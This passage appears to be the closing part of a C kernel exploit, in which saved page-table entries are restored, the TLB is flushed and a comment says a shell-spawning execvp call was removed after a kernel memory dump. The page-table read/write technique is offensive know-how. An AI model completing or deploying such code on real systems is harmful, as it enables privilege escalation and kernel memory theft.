        g_fast_rw.page_map[pte_b_index] = original_pte_b;
        __sync_synchronize();
        usleep(50000); // 50ms delay for stability

        // Proper TLB flush after restoration using mprotect
        flush_tlb_mprotect(g_fast_rw.map, PAGE_SIZE * 2);
        __sync_synchronize();

        log_info("[=== PTEs successfully restored. ===]");
    }

    // Removed execvp call - program exits after kernel dump and PTE restoration

    return 0;
}